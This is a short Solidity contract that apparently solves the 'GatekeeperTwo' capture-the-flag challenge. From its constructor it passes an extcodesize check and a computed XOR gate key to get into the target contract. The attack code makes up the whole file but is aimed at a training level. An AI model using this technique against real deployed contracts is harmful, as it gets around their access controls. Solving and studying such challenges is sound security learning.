// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import 'openzeppelin-contracts/contracts/utils/math/SafeMath.sol';

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoHack {
    using SafeMath for uint256;
    IGatekeeperTwo public challenge;
    uint64 gateKey;

    constructor(address challengeAddress) {
        challenge = IGatekeeperTwo(challengeAddress);
        // must attack already in constructor because of extcodesize == 0
        // while the contract is being constructed
        unchecked {
            gateKey = uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1);
        }
        
        challenge.enter(bytes8(gateKey));
    }
}